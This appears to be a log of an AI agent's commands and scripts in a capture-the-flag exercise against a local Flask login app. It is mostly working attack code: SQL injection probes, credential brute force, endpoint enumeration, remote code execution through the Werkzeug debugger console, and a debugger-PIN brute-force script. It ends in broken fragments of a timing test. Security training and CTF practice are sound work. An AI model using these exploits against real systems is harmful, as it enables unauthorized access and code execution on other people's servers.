args.command:
curl -s -X POST http://localhost:5003/login -d "username=test&password=test&role=employee"
curl -s -X POST http://localhost:5003/login -d "username=test'&password=test&role=employee"
curl -s -X POST http://localhost:5003/login -d "username=test%27&password=test&role=employee"
args.description: Test SQLi filter with single quote

args.command:
# Testing various characters/keywords
for test in "'" '"' ";" "(" ")" "=" "*" "select" "drop" "#" "--" "/" "%" "||" "&&" "/*" "*/" "admin"; do
    result=$(curl -s -X POST http://localhost:5003/login -d "username=test${test}test&password=test&role=employee" | grep -o '"message": "[^"]*"')
    echo "$test -> $result"
done

args.command:
# Test MySQL hex encoding and char functions
curl -s -X POST http://localhost:5003/login -d "username=0x61646d696e&password=test&role=employee"

# Test with CHAR function
curl -s -X POST http://localhost:5003/login -d "username=CHAR(97,100,109,105,110)&password=test&role=employee"

# Test backslash escape - if query is: WHERE username = '$user' 
# And we input: \' OR 1=1-- 
# Query becomes: WHERE username = '\' OR 1=1-- '
# Which might escape the quote
curl -s -X POST http://localhost:5003/login -d "username=test\\&password= OR 1=1--&role=employee"
args.description: Test backslash escape to inject in password

args.command:
# Test Unicode quotes
curl -s -X POST http://localhost:5003/login -d $'username=test\xe2\x80\x99&password=test&role=employee'

# Test array parameters (PHP-style)
curl -s -X POST http://localhost:5003/login -d 'username[]=admin&password[]=&role=employee'

args.content:
#!/usr/bin/env python3
import requests
import re

# First, trigger an exception to get frame IDs
base_url = "http://localhost:5003"

# Trigger exception
response = requests.post(f"{base_url}/login",
    headers={"Content-Type": "application/json"},
    json={})

# Extract secret and frame IDs
secret_match = re.search(r'SECRET = "([^"]+)"', response.text)
frame_matches = re.findall(r'id="frame-(\d+)"', response.text)

if secret_match and frame_matches:
    secret = secret_match.group(1)
    print(f"Secret: {secret}")
    print(f"Frames: {frame_matches}")

    # Try to execute code on each frame
    for frame_id in frame_matches:
        print(f"\nTrying frame {frame_id}...")

        # Try exec command
        exec_url = f"{base_url}/?__debugger__=yes&cmd=exec&s={secret}&frm={frame_id}"
        try:
            r = requests.get(exec_url, params={'code': 'import os; os.system("id")'})
            print(f"GET exec: {r.status_code} - {r.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")

        # Try with tb parameter
        exec_url = f"{base_url}/?__debugger__=yes&cmd=exec&s={secret}&frm={frame_id}&tb=1"
        try:
            r = requests.get(exec_url)
            print(f"GET exec with tb: {r.status_code} - {r.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")
else:
    print("Could not extract secret/frames")
    print(response.text[:1000])

messages.output: <tool_use_error>File has not been read yet. Read it first before writing to it.</tool_use_error>

#!/usr/bin/env python3
import requests
import re

# First, trigger an exception to get frame IDs
base_url = "http://localhost:5003"

# Trigger exception
response = requests.post(f"{base_url}/login",
    headers={"Content-Type": "application/json"},
    json={})

# Extract secret and frame IDs
secret_match = re.search(r'SECRET = "([^"]+)"', response.text)
frame_matches = re.findall(r'id="frame-(\d+)"', response.text)

if secret_match and frame_matches:
    secret = secret_match.group(1)
    print(f"Secret: {secret}")
    print(f"Frames: {frame_matches}")

    # Try to execute code on each frame
    for frame_id in frame_matches:
        print(f"\nTrying frame {frame_id}...")

        # Try exec command
        exec_url = f"{base_url}/?__debugger__=yes&cmd=exec&s={secret}&frm={frame_id}"
        try:
            r = requests.get(exec_url, params={'code': 'import os; os.system("id")'})
            print(f"GET exec: {r.status_code} - {r.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")

        # Try with tb parameter
        exec_url = f"{base_url}/?__debugger__=yes&cmd=exec&s={secret}&frm={frame_id}&tb=1"
        try:
            r = requests.get(exec_url)
            print(f"GET exec with tb: {r.status_code} - {r.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")
else:
    print("Could not extract secret/frames")
    print(response.text[:1000])

args.command:
# Try common usernames and passwords
for user in admin root administrator user1 employee emp; do
    for pass in admin password 123456 password123 admin123 letmein; do
        result=$(curl -s -X POST http://localhost:5003/login -d "username=$user&password=$pass&role=admin")
        if echo "$result" | grep -q '"success": true'; then
            echo "SUCCESS: $user:$pass"
            echo "$result"
        fi
    done
done
echo "Done testing common credentials"

messages.output: Done testing common credentials

args.command:
# Common endpoint discovery
for endpoint in api static files uploads admin/panel admin/users admin/config debug info backup config db database data sql test dev reset forgot password register signup logout profile settings users employee/panel employee/profile employee/list employees admins manager; do
    status=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5003/$endpoint)
    if [ "$status" != "404" ]; then
        echo "$endpoint: $status"
    fi
done

args.command:
cat > /home/smartdatayb/claudecode-ctf/pin_calc.py << 'PYEOF'
#!/usr/bin/env python3
import hashlib
import itertools
import requests

# Information gleaned from error messages
# - Flask app path: /usr/local/lib/python3.8/site-packages/flask/app.py
# - App path: /app/app.py

# Werkzeug PIN calculation
def get_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in itertools.chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    # In werkzeug >=2.0, they use SHA1
    num = None
    rv = h.hexdigest()
    num = int(rv, 16)

    rv = None
    rv = str(num % 2 ** 32)
    
    pin = rv[:3] + "-" + rv[3:6] + "-" + rv[6:]
    return pin

# Try common combinations
usernames = ['root', 'app', 'flask', 'web', 'www-data', 'nobody', 'python']
modnames = ['flask.app', 'werkzeug.debug']
appnames = ['Flask', 'flask', 'application']
paths = ['/usr/local/lib/python3.8/site-packages/flask/app.py',
         '/app/app.py',
         '/usr/lib/python3.8/site-packages/flask/app.py']

# Common MAC addresses in Docker (172.17.x.x = 02:42:ac:11:xx:xx)
# or eth0 starting with 02:42
mac_addresses = [
    # Try some common Docker MAC addresses
    str(int("024200000001", 16)),
    str(int("024200000000", 16)),
    str(int("0242ac110002", 16)),  # 172.17.0.2
    str(int("0242ac110003", 16)),
    str(int("0242ac120002", 16)),
    str(int("0242ac120003", 16)),
]

# Machine IDs 
machine_ids = [
    '',
    '1',
    'docker',
]

secret = "c2hWYmWQJ4FWsDTGEdb7"
base_url = "http://localhost:5003"

print("Trying PIN combinations...")
count = 0
for username in usernames:
    for modname in modnames:
        for appname in appnames:
            for path in paths:
                for mac in mac_addresses:
                    for mid in machine_ids:
                        probably_public_bits = [username, modname, appname, path]
                        private_bits = [mac, mid]
                        
                        pin = get_pin(probably_public_bits, private_bits)
                        count += 1
                        
                        # Test the PIN
                        r = requests.get(f"{base_url}/console", params={
                            '__debugger__': 'yes',
                            'cmd': 'pinauth',
                            'pin': pin,
                            's': secret
                        })
                        
                        result = r.json()
                        if result.get('auth'):
                            print(f"SUCCESS! PIN: {pin}")
                            print(f"public_bits: {probably_public_bits}")
                            print(f"private_bits: {private_bits}")
                            exit(0)
                        
                        if count % 100 == 0:
                            print(f"Tested {count} PINs...")

print(f"Tested {count} PINs, none worked")
PYEOF

# If the query is vulnerable, SLEEP or similar will cause delay

end=$(date +%s%N)
normal_time=$(((end-start)/1000000))

end=$(date +%s%N)

# Let me check what actually gets through with proper double encoding
